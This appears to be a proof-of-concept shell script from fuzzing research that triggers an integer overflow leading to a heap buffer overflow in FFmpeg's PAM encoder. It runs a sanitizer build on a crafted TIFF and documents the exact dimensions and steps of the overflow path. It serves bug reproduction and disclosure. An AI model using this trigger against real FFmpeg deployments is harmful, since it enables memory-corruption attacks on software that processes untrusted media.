#!/usr/bin/env bash
# vuln_001_run.sh - Trigger PAM encoder integer overflow -> heap-buffer-overflow
#
# Vulnerability: libavcodec/pamenc.c :: pam_encode_frame()
# Type: CWE-190 (Integer Overflow) -> CWE-122 (Heap-Based Buffer Overflow)
#
# Usage: bash vuln_001_run.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="${SCRIPT_DIR}/vuln_001_input.tiff"
OUTPUT="/tmp/vuln_001_out_$$.pam"

echo "========================================================"
echo " PAM Encoder Integer Overflow PoC"
echo " File:     libavcodec/pamenc.c :: pam_encode_frame()"
echo " CWE-190 (Integer Overflow) -> CWE-122 (Heap Buffer Overflow)"
echo "========================================================"
echo ""
echo "[*] Binary: ${FFMPEG}"
echo "[*] ASAN+UBSAN build"
echo ""

# Step 1: generate the crafted TIFF if not present
if [[ ! -f "${INPUT}" ]]; then
    echo "[*] Generating crafted TIFF input..."
    python3 "${SCRIPT_DIR}/vuln_001_gen.py"
    echo ""
fi
echo "[*] Input: ${INPUT} ($(du -h "${INPUT}" | cut -f1))"
echo ""

# Step 2: run ffmpeg; expect ASAN heap-buffer-overflow + UBSAN signed-integer-overflow
#
# Exploit path:
#   1. TIFF decoder reads IFD: w=16384, h=262144, BitsPerSample=1, SPP=1
#      -> AV_PIX_FMT_MONOBLACK (big-endian "MM" TIFF, BlackIsZero)
#   2. ff_thread_get_buffer: allocates 512MB virtual frame (zero pages on 64-bit Linux)
#      av_image_check_size2 PASSES: (2048+1024)*(262144+128) = 806M < INT_MAX
#   3. Strips 0,1 decoded (2048 bytes each = 1 packed row of 16384 mono pixels)
#      Strip 2: ssize=0 -> tiff_unpack_strip(size=0) returns AVERROR_INVALIDDATA
#      -> strip loop 'break' (no AV_EF_EXPLODE) -> *got_frame=1
#   4. pam_encode_frame called with w=16384, h=262144, fmt=AV_PIX_FMT_MONOBLACK:
#      n = w = 16384
#      n*h = 16384 * 262144 = 2^32 -> signed int32 overflow wraps to 0
#      UBSAN fires: signed-integer-overflow at pamenc.c:102
#      ff_get_encode_buffer(..., 0 + header_size = ~76, 0) -> 76-byte buffer
#      Row 0 loop writes 16384 bytes starting at bytestream+76 (past buffer end)
#      ASAN fires: heap-buffer-overflow at pamenc.c:116

echo "[*] Running ffmpeg (120s timeout)..."
echo ""

timeout 120 "${FFMPEG}" \
    -loglevel warning \
    -i "${INPUT}" \
    -frames:v 1 \
    -c:v pam \
    "${OUTPUT}" \
    2>&1 || true

# cleanup
rm -f "${OUTPUT}"

echo ""
echo "[*] Done. Sanitizer reports above confirm the vulnerability."
echo "    Expected: UBSAN signed-integer-overflow + ASAN heap-buffer-overflow"
echo "    Both in pam_encode_frame (libavcodec/pamenc.c)"
